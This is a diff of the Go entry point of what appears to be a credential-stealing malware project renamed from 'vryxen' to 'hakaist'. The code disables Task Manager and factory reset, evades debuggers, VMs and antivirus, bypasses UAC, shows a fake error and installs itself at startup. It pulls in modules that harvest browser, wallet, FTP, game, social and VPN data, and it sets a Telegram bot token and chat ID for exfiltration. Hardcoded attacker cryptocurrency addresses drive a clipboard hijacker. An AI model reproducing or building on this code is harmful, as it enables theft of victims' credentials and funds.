@@ -1,29 +1,27 @@
 package main
 
 import (
-	"github.com/unf6/vryxen/internal/antidebug"
-	"github.com/unf6/vryxen/internal/antivm"
-	"github.com/unf6/vryxen/internal/antivirus"
-	"github.com/unf6/vryxen/internal/fakerr"
-	"github.com/unf6/vryxen/internal/hc"
-	"github.com/unf6/vryxen/pkg/utils/startup"
-	"github.com/unf6/vryxen/internal/uac"
-	"github.com/unf6/vryxen/pkg/utils/common"
-	"github.com/unf6/vryxen/pkg/utils/processkill"
-    "github.com/unf6/vryxen/internal/fr"
-	"github.com/unf6/vryxen/internal/taskmanager"
+	"github.com/lukyydnv/hakaist/internal/antidebug"
+	"github.com/lukyydnv/hakaist/internal/antivirus"
+	AntiVMAnalysis "github.com/lukyydnv/hakaist/internal/antivm"
+	FakeError "github.com/lukyydnv/hakaist/internal/fakerr"
+	FactoryReset "github.com/lukyydnv/hakaist/internal/fr"
+	HideConsole "github.com/lukyydnv/hakaist/internal/hc"
+	TaskManager "github.com/lukyydnv/hakaist/internal/taskmanager"
+	Uac "github.com/lukyydnv/hakaist/internal/uac"
+	"github.com/lukyydnv/hakaist/pkg/utils/common"
+	"github.com/lukyydnv/hakaist/pkg/utils/processkill"
+	"github.com/lukyydnv/hakaist/pkg/utils/startup"
 
-
-	
-	"github.com/unf6/vryxen/internal/core/socials"
-	"github.com/unf6/vryxen/internal/core/cryptowallets"
-	"github.com/unf6/vryxen/internal/core/ftps"
-	"github.com/unf6/vryxen/internal/core/games"
-	"github.com/unf6/vryxen/internal/core/system"
-	"github.com/unf6/vryxen/internal/core/browsers"
-	"github.com/unf6/vryxen/internal/core/clipper"
-	"github.com/unf6/vryxen/internal/core/commonfiles"
-	"github.com/unf6/vryxen/internal/core/vpn"
+	"github.com/lukyydnv/hakaist/internal/core/browsers"
+	"github.com/lukyydnv/hakaist/internal/core/clipper"
+	"github.com/lukyydnv/hakaist/internal/core/commonfiles"
+	wallets "github.com/lukyydnv/hakaist/internal/core/cryptowallets"
+	"github.com/lukyydnv/hakaist/internal/core/ftps"
+	"github.com/lukyydnv/hakaist/internal/core/games"
+	Socials "github.com/lukyydnv/hakaist/internal/core/socials"
+	"github.com/lukyydnv/hakaist/internal/core/system"
+	"github.com/lukyydnv/hakaist/internal/core/vpn"
 )
 
 var botToken string
@@ -32,17 +30,17 @@ var chatId string
 func main() {
 	CONFIG := map[string]interface{}{
 		"botToken": botToken,
-		"chatId": chatId,
+		"chatId":   chatId,
 		"cryptos": map[string]string{
-			"BTC": "bc1qr85hew3n2xcufmh59299mnpt46nzpnd746gksh",
-			"BCH": "",
-			"ETH": "0x5989a6be6de95ee566526750c4AC9C6Ea9CbEba3",
-			"XMR": "",
-			"LTC": "LNZdCeEmGSbnUeA9eyRHtkok45KHfZUnWq",
-			"XCH": "",
-			"XLM": "",
-			"TRX": "TXrZgcxmzwoAazhuvhX31iYFvHPo3mu2ew",
-			"ADA": "",
+			"BTC":  "bc1qr85hew3n2xcufmh59299mnpt46nzpnd746gksh",
+			"BCH":  "",
+			"ETH":  "0x5989a6be6de95ee566526750c4AC9C6Ea9CbEba3",
+			"XMR":  "",
+			"LTC":  "LNZdCeEmGSbnUeA9eyRHtkok45KHfZUnWq",
+			"XCH":  "",
+			"XLM":  "",
+			"TRX":  "TXrZgcxmzwoAazhuvhX31iYFvHPo3mu2ew",
+			"ADA":  "",
 			"DASH": "XqxWKQviNx6ZPPKjp5Wu1zmhvBWGuNTSQF",
 			"DOGE": "DEm6Fp8swrKsGipeok36SeUq98CB9bCo9J",
 		},
@@ -60,7 +58,6 @@ func main() {
 	FactoryReset.Disable()
 	TaskManager.Disable()
 
-	
 	if !common.IsInStartupPath() {
 		go FakeError.Show()
 		go startup.Run()
